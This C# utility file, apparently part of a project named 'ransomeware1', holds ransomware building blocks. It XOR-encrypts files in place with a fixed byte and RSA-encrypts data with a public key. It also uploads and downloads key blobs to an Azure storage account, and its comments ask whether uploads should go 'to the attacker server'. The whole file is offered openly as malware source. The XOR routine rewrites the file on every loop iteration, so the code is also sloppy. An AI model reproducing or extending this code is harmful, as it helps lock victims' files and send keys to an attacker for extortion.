using Microsoft.WindowsAzure.Storage; // Namespace for CloudStorageAccount
using Microsoft.WindowsAzure.Storage.Blob; // Namespace for Blob storage types
using Microsoft.Azure; //Namespace for CloudConfigurationManager
using System;
using System.IO;
using System.Security.Cryptography;
using ransomeware1;


public static class Utils
{
    public static string getPath()
    {
        return "./ransomeware/";
    }


    public static CloudStorageAccount Connect(string name, string key)
    {
        string connctionString1 = "DefaultEndpointsProtocol=https;AccountName=";
        string connectionString2 = ";AccountKey=";
        string connectionString3 = ";EndpointSuffix=core.windows.net";
        string connectionString = connctionString1 + name + connectionString2 + key + connectionString3;
        // Retrieve storage account from connection string.
        //CloudStorageAccount storageAccount = CloudStorageAccount.Parse(
        //CloudConfigurationManager.GetSetting("StorageConnectionString"));
        CloudStorageAccount storageAccount = CloudStorageAccount.Parse(connectionString);
        return storageAccount;
    }


    public static void EncryptLocally(string filepath) //encrypted by xor
    {

        byte[] bArray = File.ReadAllBytes(filepath);
        byte secret = 153;

        for (int i = 0; i < bArray.Length; i++)
        {
            byte c = (byte)(bArray[i] ^ secret);
            bArray[i] = c;
            File.WriteAllBytes(filepath, bArray);
        }
    }

    public static void DecryptLocally(string filepath) //encrypted by xor
    {

        byte[] bArray = File.ReadAllBytes(filepath);
        byte secret = 153;

        for (int i = 0; i < bArray.Length; i++)
        {
            byte c = (byte)(bArray[i] ^ secret);
            bArray[i] = c;
            File.WriteAllBytes(filepath, bArray);
        }
    }


    public static byte[] RSAEncryptBytes(byte[] dataToEncrypt, string publicKeyPath)
    {
        RSACryptoServiceProvider provider = PemKeyUtils.GetRSAProviderFromPemFile(publicKeyPath);
        return provider.Encrypt(dataToEncrypt, false);
    }

    static byte[] RSADecrypt(byte[] DataToDecrypt, RSAParameters RSAKeyInfo, bool DoOAEPPadding)
    {
        /*
         *  This functions include this line is for the azure function only. 
         * provider = PemKeyUtils.GetRSAProviderFromPemFile(@"private_key.pem");
            decryptedData = RSADecrypt(encryptedData, provider.ExportParameters(true), false);
        */
        try
        {
            byte[] decryptedData;
            //Create a new instance of RSACryptoServiceProvider.
            using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
            {
                //Import the RSA Key information. This needs
                //to include the private key information.
                RSA.ImportParameters(RSAKeyInfo);

                //Decrypt the passed byte array and specify OAEP padding.  
                //OAEP padding is only available on Microsoft Windows XP or
                //later.  
                decryptedData = RSA.Decrypt(DataToDecrypt, DoOAEPPadding);
            }
            return decryptedData;
        }
        //Catch and display a CryptographicException  
        //to the console.
        catch (CryptographicException e)
        {
            Console.WriteLine(e.ToString());
            return null;
        }

    }

    public static void Upload(CloudStorageAccount storageAccount, byte[] data, string keyType) //todo: should be written to the attacker server?
    {
        CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();

        // Retrieve reference to a previously created container.
        CloudBlobContainer container = blobClient.GetContainerReference("public");

        // Retrieve reference to a blob named "keyType".
        CloudBlockBlob blockBlob = container.GetBlockBlobReference(keyType);

        using (var stream = new MemoryStream(data, writable: false))
        {
            blockBlob.UploadFromStream(stream);
        }
    }


    public static void Download(CloudStorageAccount storageAccount, string keyType) //todo: should be written to the attacker server?
    {
        CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();

        // Retrieve reference to a previously created container.
        CloudBlobContainer container = blobClient.GetContainerReference("public");

        // Retrieve reference to a blob named keyType.
        CloudBlockBlob blockBlob = container.GetBlockBlobReference(keyType);

        // Save blob contents to a file.
        using (var fileStream = System.IO.File.OpenWrite(keyType + ".txt"))
        {
            blockBlob.DownloadToStream(fileStream);
        }
    }


    






}